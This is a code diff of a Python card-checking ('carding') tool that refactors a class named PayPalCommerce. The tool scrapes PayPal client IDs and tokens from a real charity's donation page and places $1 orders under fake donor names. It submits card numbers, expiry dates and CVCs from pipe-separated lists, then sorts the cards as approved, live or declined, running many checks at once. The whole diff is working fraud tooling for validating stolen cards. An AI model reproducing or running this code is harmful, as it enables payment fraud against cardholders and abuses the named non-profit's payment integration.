@@ -106,12 +106,12 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ===================== PAYPAL CLASS =====================
+# ===================== PAYPAL COMMERCE CLASS =====================
 
-class PayPalLinkTester:
+class PayPalCommerce:
     def __init__(self, target_url):
-        self.first_name = ["James", "John", "Robert", "Michael", "William"]
-        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
+        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
+        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
         self.donation = "1.00"
         self.r = requests.Session()
         self.r.verify = False
@@ -128,134 +128,35 @@ class PayPalLinkTester:
         if urlparse(target_url).query:
             self.inurl += f"?{urlparse(target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
-
-    def Charge(self, ccx):
-        try:
-            self._init_and_extract()
-            self._try_all_token_methods()
-            
-            parts = ccx.strip().split("|")
-            if len(parts) < 4:
-                return "Invalid card format"
-            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            
-            try:
-                exp_year = int(f"20{yy}")
-                exp_month = int(mm)
-                now = datetime.now()
-                if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
-                    return "EXPIRED_CARD"
-            except:
-                pass
-            
-            expiry = f"20{yy}-{mm}"
-            order_id = self._create_order()
-            
-            if not order_id:
-                return "Create Order Failed"
-            
-            auth_tokens = []
-            if self.client_token:
-                auth_tokens.append(self.client_token)
-            if self.access_token:
-                auth_tokens.append(self.access_token)
-            if self.client_id:
-                auth_tokens.append(self.client_id)
-            
-            confirm_json = {}
-            for auth_token in auth_tokens:
-                he4 = {
-                    'authorization': f'Bearer {auth_token}',
-                    'paypal-client-metadata-id': self.client_id or '',
-                    'user-agent': self.uu.random,
-                    'paypal-request-id': str(uuid.uuid4()),
-                }
-                da3 = {
-                    'payment_source': {
-                        'card': {
-                            'number': n,
-                            'expiry': expiry,
-                            'security_code': cvc,
-                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
-                        }
-                    },
-                    'application_context': {'vault': False},
-                }
-                try:
-                    confirm_res = self.r.post(
-                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
-                        headers=he4,
-                        json=da3,
-                        timeout=15
-                    )
-                    
-                    # ننضف الرد من confirm فورًا
-                    clean = self._clean_response(confirm_res.text)
-                    if clean and clean != "DECLINED":
-                        return clean
-                    
-                    if confirm_res.status_code == 200:
-                        try:
-                            confirm_json = confirm_res.json()
-                        except:
-                            confirm_json = {}
-                        break
-                except:
-                    continue
-            
-            # Check confirm_json for errors
-            if isinstance(confirm_json, dict):
-                confirm_str = str(confirm_json).upper()
-                if 'INSUFFICIENT_FUNDS' in confirm_str:
-                    return "INSUFFICIENT_FUNDS"
-                if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in confirm_str:
-                    return "RESTRICTED_OR_INACTIVE_ACCOUNT"
-                if 'PAYEE_BLOCKED_TRANSACTION' in confirm_str:
-                    return "PAYEE_BLOCKED_TRANSACTION"
-                if 'SUSPECTED_FRAUD' in confirm_str:
-                    return "SUSPECTED_FRAUD"
-                if 'EXPIRED_CARD' in confirm_str:
-                    return "EXPIRED_CARD"
-            
-            approve_res = self._approve_order(order_id)
-            text = approve_res.text if approve_res else ''
-            
-            return self._clean_response(text)
-        except Exception as e:
-            return f"Error: {e}"
+        self._init_and_extract()
+        self._get_access_token()
+        self._get_client_token()
 
     def _init_and_extract(self):
         try:
-            headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
+            headers = {
+                'user-agent': self.uu.random,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9'
+            }
             response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
             self.cookies = dict(response.cookies)
             html = response.text
             self._extract_client_id(html)
             self._extract_form_data(html)
             self._extract_ajax_url(html)
-            self._extract_all_tokens(html)
-        except:
-            pass
+        except Exception as e:
+            print(f"Init error: {e}")
 
     def _extract_client_id(self, html):
         patterns = [
-            r'client-id=["\']([^"\']+)["\']',
-            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'data-client-id=["\']([^"\']+)["\']',
-            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
-            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'"clientId"\s*:\s*"([^"]+)"',
-            r'client_id\s*=\s*["\']([^"\']+)["\']',
-            r'merchant-id=["\']([^"\']+)["\']',
-            r'data-merchant-id=["\']([^"\']+)["\']',
-            r'"merchant_id"\s*:\s*"([^"]+)"',
-            r'data-paypal-client-id=["\']([^"\']+)["\']',
-            r'paypal-client-id=["\']([^"\']+)["\']',
+            r'client-id="([^"]+)"',
+            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'data-client-id="([^"]+)"',
+            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
+            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
         ]
-        
         for pattern in patterns:
             match = re.search(pattern, html, re.IGNORECASE)
             if match:
@@ -280,10 +181,9 @@ class PayPalLinkTester:
         inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
         for name, value in inputs:
             self.form_data[name] = value
-        
         data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
         for attr_name, attr_value in data_attrs:
-            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash', 'token', 'order']):
+            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
                 self.form_data[attr_name] = attr_value
 
     def _extract_ajax_url(self, html):
@@ -292,225 +192,74 @@ class PayPalLinkTester:
         elif 'wc-ajax' in html:
             self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'
 
-    def _extract_all_tokens(self, html):
-        patterns = [
-            r'data-client-token=["\']([^"\']+)["\']',
-            r'"data-client-token"\s*:\s*"([^"]+)"',
-            r'client-token=["\']([^"\']+)["\']',
-            r'client_token=["\']([^"\']+)["\']',
-            r'clientToken=["\']([^"\']+)["\']',
-            r'"clientToken"\s*:\s*"([^"]+)"',
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, html, re.IGNORECASE)
-            if match:
-                enc = match.group(1)
-                try:
-                    padded = enc + '=' * (-len(enc) % 4)
-                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
-                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
-                    if token_match:
-                        self.access_token = token_match.group(1)
-                        return
-                except:
-                    pass
-                self.client_token = enc
-                return
-        
-        direct_patterns = [
-            r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
-            r'"accessToken"\s*:\s*"([^"]+)"',
-            r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
-            r'"access_token"\s*:\s*"([^"]+)"',
-            r'accessToken=([^&\s"\']+)',
-        ]
-        
-        for pattern in direct_patterns:
-            match = re.search(pattern, html, re.IGNORECASE)
-            if match:
-                self.access_token = match.group(1)
-                return
-
-    def _try_all_token_methods(self):
-        if self.access_token:
-            return
-        
-        if self.client_id:
-            token = self._get_oauth_token()
-            if token:
-                self.access_token = token
-                return
-        
-        if self.ajax_url:
-            token = self._get_client_token_from_site()
-            if token:
-                self.access_token = token
-                return
-
-    def _get_oauth_token(self):
+    def _get_access_token(self):
+        if not self.client_id:
+            return None
         try:
-            auth_header = base64.b64encode(f"{self.client_id}:".encode()).decode()
             headers = {
-                'authorization': f'Basic {auth_header}',
-                'content-type': 'application/x-www-form-urlencoded',
                 'user-agent': self.uu.random,
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded'
             }
             response = self.r.post(
                 'https://api-m.paypal.com/v1/oauth2/token',
                 headers=headers,
                 data={'grant_type': 'client_credentials'},
-                timeout=15
-            )
-            if response.status_code == 200:
-                return response.json().get('access_token')
-        except:
-            pass
-        
-        try:
-            response = self.r.post(
-                'https://api-m.paypal.com/v1/oauth2/token',
                 auth=(self.client_id, ''),
-                data={'grant_type': 'client_credentials'},
-                headers={'user-agent': self.uu.random},
                 timeout=15
             )
             if response.status_code == 200:
-                return response.json().get('access_token')
-        except:
-            pass
-        
+                self.access_token = response.json().get('access_token')
+                return self.access_token
+        except Exception as e:
+            print(f"Access token error: {e}")
         return None
 
-    def _get_client_token_from_site(self):
-        actions = [
-            'give_paypal_commerce_get_client_token',
-            'get_client_token',
-            'paypal_get_client_token',
-            'give_paypal_get_client_token',
-            'ppcp_get_client_token',
-            'wc_ppcp_get_client_token',
-        ]
-        
-        for action in actions:
-            try:
+    def _get_client_token(self):
+        if not self.ajax_url:
+            return None
+        try:
+            actions = [
+                'give_paypal_commerce_get_client_token',
+                'get_client_token',
+                'paypal_get_client_token'
+            ]
+            for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                 headers = {
                     'user-agent': self.uu.random,
                     'x-requested-with': 'XMLHttpRequest',
                     'origin': f'https://{self.url}',
                     'referer': f'https://{self.url}{self.inurl}',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
                 }
                 response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                 if response.status_code == 200 and response.text:
-                    json_data = response.json()
-                    token = None
-                    if 'data' in json_data:
-                        if isinstance(json_data['data'], dict):
-                            token = json_data['data'].get('client_token') or json_data['data'].get('token') or json_data['data'].get('access_token')
-                        elif isinstance(json_data['data'], str):
-                            token = json_data['data']
-                    elif 'client_token' in json_data:
-                        token = json_data['client_token']
-                    elif 'token' in json_data:
-                        token = json_data['token']
-                    elif 'access_token' in json_data:
-                        token = json_data['access_token']
-                    
-                    if token:
-                        if '.' not in token:
-                            try:
-                                padded = token + '=' * (-len(token) % 4)
-                                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
-                                token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
-                                if token_match:
-                                    return token_match.group(1)
-                            except:
-                                pass
-                        return token
-            except:
-                continue
-        
-        return None
-
-    def _clean_response(self, text):
-        if not text:
-            return "DECLINED"
-        
-        text_upper = text.upper()
-        text_lower = text.lower()
-        
-        if '<!DOCTYPE' in text_upper or '<html' in text_upper:
-            return "DECLINED"
-        
-        # نحاول نقرأ JSON
-        try:
-            json_data = json.loads(text)
-            if isinstance(json_data, dict):
-                # check data.status
-                if 'data' in json_data and isinstance(json_data['data'], dict):
-                    if 'status' in json_data['data']:
-                        status_val = str(json_data['data']['status']).upper()
-                        if status_val == 'COMPLETED':
-                            return "CHARGE 1.0"
-                    if 'success' in json_data['data']:
-                        if json_data['data']['success'] == True or str(json_data['data']['success']).lower() == 'true':
-                            return "CHARGE 1.0"
-                
-                # check status
-                if 'status' in json_data:
-                    status_val = str(json_data['status']).upper()
-                    if status_val == 'COMPLETED':
-                        return "CHARGE 1.0"
-                
-                # check success
-                if 'success' in json_data:
-                    if json_data['success'] == True or str(json_data['success']).lower() == 'true':
-                        return "CHARGE 1.0"
-        except:
-            pass
-        
-        # لو النص "true" صريح
-        if text_lower.strip() == 'true':
-            return "CHARGE 1.0"
-        
-        # رسائل محددة
-        if 'insufficient' in text_lower:
-            return "INSUFFICIENT_FUNDS"
-        
-        if 'order_not_approved' in text_lower:
-            return "Payer cannot pay for this transaction."
-            
-        if 'expired_card' in text_lower or 'expired_credit_card' in text_lower:
-            return "EXPIRED_CARD"
-        elif 'payee_blocked_transaction' in text_lower:
-            return "PAYEE_BLOCKED_TRANSACTION"
-        elif 'suspected_fraud' in text_lower:
-            return "SUSPECTED_FRAUD"
-        elif 'restricted_or_inactive_account' in text_lower:
-            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
-        elif 'declined' in text_lower or 'error' in text_lower or 'expecting' in text_lower or 'invalid' in text_lower or 'failed' in text_lower:
-            return "DECLINED"
-        
-        return text[:80]
+                    try:
+                        json_data = response.json()
+                        if 'data' in json_data:
+                            if isinstance(json_data['data'], dict):
+                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
+                            elif isinstance(json_data['data'], str):
+                                self.client_token = json_data['data']
+                            if self.client_token:
+                                return self.client_token
+                    except:
+                        pass
+            return None
+        except Exception as e:
+            print(f"Client token error: {e}")
+            return None
 
     def _create_order(self):
-        if self.ajax_url and 'admin-ajax' in self.ajax_url:
+        if self.ajax_url:
             order_id = self._create_order_givewp()
             if order_id:
                 return order_id
-        
         if self.access_token:
             order_id = self._create_order_direct()
             if order_id:
                 return order_id
-        
-        if self.client_token:
-            order_id = self._create_order_with_client_token()
-            if order_id:
-                return order_id
-        
         return None
 
     def _create_order_givewp(self):
@@ -566,8 +315,7 @@ class PayPalLinkTester:
                 'authorization': f'Bearer {self.access_token}',
                 'content-type': 'application/json',
                 'user-agent': self.uu.random,
-                'accept': 'application/json',
-                'paypal-request-id': str(uuid.uuid4()),
+                'accept': 'application/json'
             }
             data = {
                 'intent': 'CAPTURE',
@@ -576,33 +324,8 @@ class PayPalLinkTester:
                 }],
                 'application_context': {
                     'shipping_preference': 'NO_SHIPPING',
-                    'user_action': 'PAY_NOW',
+                    'user_action': 'PAY_NOW'
                 }
-            }
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
-            if response.status_code in [200, 201]:
-                response_data = response.json()
-                if 'id' in response_data:
-                    return response_data['id']
-            return None
-        except:
-            return None
-
-    def _create_order_with_client_token(self):
-        if not self.client_token:
-            return None
-        try:
-            headers = {
-                'authorization': f'Bearer {self.client_token}',
-                'content-type': 'application/json',
-                'user-agent': self.uu.random,
-                'accept': 'application/json',
-            }
-            data = {
-                'intent': 'CAPTURE',
-                'purchase_units': [{
-                    'amount': {'currency_code': 'USD', 'value': self.donation}
-                }]
             }
             response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
             if response.status_code in [200, 201]:
@@ -614,30 +337,6 @@ class PayPalLinkTester:
             return None
 
     def _approve_order(self, order_id):
-        if self.ajax_url and 'admin-ajax' in self.ajax_url:
-            result = self._approve_order_givewp(order_id)
-            if result:
-                return result
-        
-        if self.access_token:
-            try:
-                headers = {
-                    'authorization': f'Bearer {self.access_token}',
-                    'content-type': 'application/json',
-                    'user-agent': self.uu.random,
-                }
-                response = self.r.post(
-                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
-                    headers=headers,
-                    timeout=15
-                )
-                return response
-            except:
-                pass
-        
-        return None
-
-    def _approve_order_givewp(self, order_id):
         if not self.ajax_url:
             return None
         form_data = self.form_data.copy()
@@ -668,24 +367,202 @@ class PayPalLinkTester:
                 continue
         return None
 
-# ===================== END PAYPAL CLASS =====================
+    def Charge(self, ccx):
+        try:
+            parts = ccx.strip().split("|")
+            if len(parts) < 4:
+                return "Invalid card format"
+            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+            if "20" in yy:
+                yy = yy.split("20")[1]
+            expiry = f"20{yy}-{mm}"
+            
+            order_id = self._create_order()
+            if not order_id:
+                return "Create Order Failed"
+            
+            auth_tokens = []
+            if self.client_token:
+                auth_tokens.append(self.client_token)
+            if self.access_token:
+                auth_tokens.append(self.access_token)
+            if self.client_id:
+                auth_tokens.append(self.client_id)
+            
+            confirm_res = None
+            confirm_json = {}
+            confirm_text = ""
+            
+            for auth_token in auth_tokens:
+                he4 = {
+                    'authorization': f'Bearer {auth_token}',
+                    'paypal-client-metadata-id': self.client_id or '',
+                    'user-agent': self.uu.random
+                }
+                da3 = {
+                    'payment_source': {
+                        'card': {
+                            'number': n,
+                            'expiry': expiry,
+                            'security_code': cvc,
+                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
+                        }
+                    },
+                    'application_context': {'vault': False},
+                }
+                try:
+                    confirm_res = self.r.post(
+                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
+                        headers=he4,
+                        json=da3,
+                        timeout=15
+                    )
+                    confirm_text = confirm_res.text
+                    
+                    if confirm_res.status_code == 200:
+                        try:
+                            confirm_json = confirm_res.json()
+                        except:
+                            confirm_json = {}
+                        break
+                except:
+                    continue
+            
+            # استخراج الرد من confirm_json
+            if isinstance(confirm_json, dict):
+                if 'details' in confirm_json and len(confirm_json['details']) > 0:
+                    detail = confirm_json['details'][0]
+                    issue = detail.get('issue', '')
+                    description = detail.get('description', '')
+                    if issue:
+                        if description:
+                            return f"{issue}: {description}"
+                        return issue
+                
+                if 'name' in confirm_json:
+                    name = confirm_json.get('name', '')
+                    msg = confirm_json.get('message', '')
+                    if msg:
+                        return f"{name}: {msg}"
+                    return name
+                
+                if 'message' in confirm_json:
+                    msg = confirm_json.get('message', '')
+                    if msg:
+                        return msg
+            
+            # استخراج الرد من confirm_text
+            if confirm_text:
+                try:
+                    text_json = json.loads(confirm_text)
+                    if isinstance(text_json, dict):
+                        if 'details' in text_json and len(text_json['details']) > 0:
+                            detail = text_json['details'][0]
+                            issue = detail.get('issue', '')
+                            description = detail.get('description', '')
+                            if issue:
+                                if description:
+                                    return f"{issue}: {description}"
+                                return issue
+                        
+                        if 'name' in text_json:
+                            name = text_json.get('name', '')
+                            msg = text_json.get('message', '')
+                            if msg:
+                                return f"{name}: {msg}"
+                            return name
+                except:
+                    pass
+                
+                issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
+                if issue_matches:
+                    issue = issue_matches[0]
+                    desc_matches = re.findall(r'"description"\s*:\s*"([^"]+)"', confirm_text)
+                    if desc_matches:
+                        return f"{issue}: {desc_matches[0]}"
+                    return issue
+                
+                name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
+                if name_matches:
+                    name = name_matches[0]
+                    msg_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', confirm_text)
+                    if msg_matches:
+                        return f"{name}: {msg_matches[0]}"
+                    return name
+            
+            # Approve order
+            approve_res = self._approve_order(order_id)
+            text = approve_res.text if approve_res else ''
+            
+            if text:
+                if 'true' in text.lower():
+                    return 'CHARGE 1.0'
+                
+                try:
+                    approve_json = approve_res.json()
+                    if isinstance(approve_json, dict):
+                        if 'data' in approve_json:
+                            if isinstance(approve_json['data'], dict):
+                                if 'error' in approve_json['data']:
+                                    return str(approve_json['data']['error'])
+                                if 'details' in approve_json['data']:
+                                    details = approve_json['data']['details']
+                                    if isinstance(details, list) and len(details) > 0:
+                                        detail = details[0]
+                                        issue = detail.get('issue', '')
+                                        description = detail.get('description', '')
+                                        if issue:
+                                            if description:
+                                                return f"{issue}: {description}"
+                                            return issue
+                except:
+                    pass
+                
+                issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', text)
+                if issue_matches:
+                    return issue_matches[0]
+                
+                name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', text)
+                if name_matches:
+                    return name_matches[0]
+                
+                error_matches = re.findall(r'"error"\s*:\s*"([^"]+)"', text)
+                if error_matches:
+                    return error_matches[0]
+                
+                if len(text) < 200:
+                    return text
+            
+            return "DECLINED"
+        except Exception as e:
+            return f"Error: {e}"
+
+# ===================== END PAYPAL COMMERCE CLASS =====================
 
 async def check_card_api(card_full, gateway_url):
     async with api_semaphore:
         try:
             loop = asyncio.get_event_loop()
             def run_check():
-                pp_engine = PayPalLinkTester(target_url=gateway_url if gateway_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/')
+                pp_engine = PayPalCommerce(target_url=gateway_url if gateway_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/')
                 return pp_engine.Charge(card_full)
             result_raw = await loop.run_in_executor(None, run_check)
-            result = str(result_raw).lower()
+            result = str(result_raw)
+            result_lower = result.lower()
             
-            if "charge 1.0" in result or "charge $" in result:
+            if "true" in result_lower or "charge 1" in result_lower or "charge $" in result_lower or "charged" in result_lower:
                 return "approved", result_raw
-            elif "insufficient" in result:
+            elif "insufficient" in result_lower:
                 return "live", result_raw
             else:
-                return "declined", result_raw if result_raw else "Declined"
+                if result.startswith("Error:"):
+                    result = result.replace("Error:", "").strip()
+                
+                if result and result != "DECLINED":
+                    return "declined", result
+                else:
+                    return "declined", "Declined"
+                    
         except Exception as e:
             return "declined", f"Error: {e}"
 
